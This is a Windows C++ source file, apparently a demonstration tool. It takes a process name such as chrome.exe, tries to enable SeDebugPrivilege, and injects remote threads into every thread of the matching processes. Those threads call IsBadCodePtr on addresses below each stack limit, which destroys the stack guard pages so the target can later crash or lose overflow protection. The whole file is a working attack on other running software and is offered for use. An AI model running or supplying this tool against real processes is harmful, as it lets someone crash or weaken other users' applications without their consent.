// Compile command:
// cl.exe /Ox /EHsc demo4.cpp Shlwapi.lib Advapi32.lib

#define UNICODE

#include <SDKDDKVer.h>
#include <windows.h>
#include <Winternl.h>
#include <psapi.h>
#include <process.h>
#include <tlhelp32.h>
#include <Winnt.h>
#include <intrin.h>
#include <Shlwapi.h>

#include <stdio.h>
#include <tchar.h>

// Using Microsoft's intrinsics instead of inline assembly
static _NT_TIB * getTib()
{
#if defined(_M_IX86)
#define PcTeb 0x18
    return (_NT_TIB *) __readfsdword(0x18);
#elif defined(_M_AMD64)
    return (_NT_TIB *) __readgsqword(FIELD_OFFSET(NT_TIB, Self));
#endif
}

DWORD GetProcessIdByName(const wchar_t* name)
{
    HANDLE process_snapshot;
    PROCESSENTRY32 process_entry;

    process_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (process_snapshot == INVALID_HANDLE_VALUE)
        return 0;

    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(process_snapshot, &process_entry))
        return 0;

    do {
        if (wcscmp(process_entry.szExeFile, name) == 0) {
            CloseHandle(process_snapshot);
            return process_entry.th32ProcessID;
        }
    } while(Process32Next( process_snapshot, &process_entry));

    CloseHandle(process_snapshot);
    return 0;
}

const int ThreadTebInformation = 26;

typedef struct _THREAD_TEB_INFORMATION
{
    PVOID TebInformation;
    ULONG TebOffset;
    ULONG BytesToRead;
} THREAD_TEB_INFORMATION, *PTHREAD_TEB_INFORMATION;

typedef NTSTATUS(WINAPI *NTQUERYINFOMATIONTHREAD)(HANDLE, LONG, PVOID, ULONG, PULONG);

static DWORD_PTR GetThreadStackLimitAddress(DWORD thread_id)
{
    HANDLE thread_handle = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | SYNCHRONIZE,
        FALSE,
        thread_id
    );
    if (thread_handle == NULL)
        return 0;

    HINSTANCE ntdllInstance;
    NTQUERYINFOMATIONTHREAD pfNtQueryInfoThread = NULL;

    ntdllInstance = LoadLibraryW(L"Ntdll.dll");

    if (ntdllInstance != NULL)
    {
        pfNtQueryInfoThread = (NTQUERYINFOMATIONTHREAD) GetProcAddress(ntdllInstance, "NtQueryInformationThread");
    }

    if (pfNtQueryInfoThread == NULL)
        return 0;

    THREAD_TEB_INFORMATION TebInfo = { 0 };
    NT_TIB TibNative = { 0 };
    TebInfo.TebInformation = &TibNative;
    TebInfo.TebOffset = 0;
    TebInfo.BytesToRead = sizeof(TibNative);
    ULONG ReturnLength = 0;
    
    NTSTATUS Status = pfNtQueryInfoThread(
        thread_handle,
        (THREADINFOCLASS)ThreadTebInformation,
        &TebInfo,
        sizeof(TebInfo),
        &ReturnLength);

    if (!NT_SUCCESS(Status))
    {
        return 0;
    }

    return (DWORD_PTR)TibNative.StackLimit;
}

static void BreakStackGuardPage(HANDLE hProcess, DWORD_PTR stackLimit)
{
    LPVOID _IsBadCodePtr;
    HANDLE hRemoteThread;
    DWORD remoteThreadId;

    // Execute IsBadCodePtr in the remote thread on stackLimit address.
    _IsBadCodePtr = (LPVOID) GetProcAddress(GetModuleHandle(L"kernel32.dll"), "IsBadCodePtr");
    hRemoteThread = CreateRemoteThread(
        hProcess,
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE) _IsBadCodePtr,
        (LPVOID)(stackLimit - sizeof(DWORD_PTR)),
        NULL,
        &remoteThreadId
    );
    if (hRemoteThread == NULL)
    {
        printf("Failed to create remote thread\n");
        return;
    }

    WaitForSingleObject(hRemoteThread, 10000);
}

void BrakeThreadGuardPagesInProcess(HANDLE hProcess, DWORD owner_pid)
{ 
    HANDLE thread_snapshot = INVALID_HANDLE_VALUE; 
    THREADENTRY32 thread_entry;
 
    thread_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
    if(thread_snapshot == INVALID_HANDLE_VALUE)
        return;
 
    thread_entry.dwSize = sizeof(THREADENTRY32); 
 
    if(!Thread32First(thread_snapshot, &thread_entry ))
        return;

    do { 
        if (thread_entry.th32OwnerProcessID == owner_pid)
        {
            printf("Blowing the guard page. (thread_id = %d).\n", thread_entry.th32ThreadID);

            DWORD_PTR stackLimitAddr = GetThreadStackLimitAddress(thread_entry.th32ThreadID);
            if (stackLimitAddr != 0)
            {
                BreakStackGuardPage(hProcess, stackLimitAddr);
                stackLimitAddr -= 0x1000;
                BreakStackGuardPage(hProcess, stackLimitAddr);
#if defined(_M_AMD64)
                stackLimitAddr -= 0x1000;
                BreakStackGuardPage(hProcess, stackLimitAddr);
#endif
            }
        }
    } while(Thread32Next(thread_snapshot, &thread_entry)); 

    CloseHandle(thread_snapshot);
}

bool BrakeStackGuardPages(const char victimProcessName[])
{
    bool succeeded = false;
    DWORD aProcesses[4096], bytesReturned;

    if (EnumProcesses(aProcesses, sizeof(aProcesses), &bytesReturned) != 0) {
        for (unsigned i = 0; i < bytesReturned / sizeof(DWORD); i++) {
            DWORD processID = aProcesses[i];
            CHAR szProcessName[MAX_PATH];

            HANDLE hProcess = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
                FALSE,
                processID
            );

            if (hProcess == NULL) {
                // printf("Failed open process id = %x, LastError = %x\n", processID, GetLastError());
                continue;
            }

            // printf("Opened process id = %x\n", processID);

            DWORD nSize = sizeof(szProcessName)/sizeof(szProcessName[0]);
            if (GetModuleFileNameExA(hProcess, NULL, szProcessName, nSize) == 0)
                continue;
                
            PathStripPathA(szProcessName);
            if (_stricmp(szProcessName, victimProcessName) == 0)
            {
                printf("Process name matched: %s\n", szProcessName);
                BrakeThreadGuardPagesInProcess(hProcess, processID);
                succeeded = true;
            }
        }
    }

    return succeeded;
}

_declspec(noinline) void Crash()
{
    printf("Crash\n");

    // This function simply allocate a big local array and initalizes first element
    volatile char test[0x1000];
    ZeroMemory((void *) test, sizeof(test));
    test[0] = 1;
}

// See https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113
bool TryToObtainSeDebugPrivilege()
{
    HANDLE Token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token) == FALSE)
    {
        return false;
    }

    LUID Luid;
    if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid) == FALSE)
    {
        return false;
    }

    TOKEN_PRIVILEGES NewState;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = Luid;
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (AdjustTokenPrivileges(Token, FALSE, &NewState, sizeof(NewState), NULL, NULL) == 0
        || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        return false;
    }

    return true;
}

int main(int argc, char* argv[])
{
    // Check the number of parameters
    if (argc < 2)
    {
        printf("Usage: %s <Process name>\n", argv[0]);
        printf("  e.g. %s chrome.exe\n", argv[0]);
        return 1;
    }

    if (TryToObtainSeDebugPrivilege())
    {
        printf("You're lucky. Now you own the farm.\n");
    }

    if (BrakeStackGuardPages(argv[1]))
    {
        printf("!!! Process %s's guard pages were blown off.\n %s, Please tread carefully !!!", argv[1], argv[1]);
    }
    else
    {
        printf("Failed to brake the guard page for %s", argv[1]);
    }

    return 0;
}
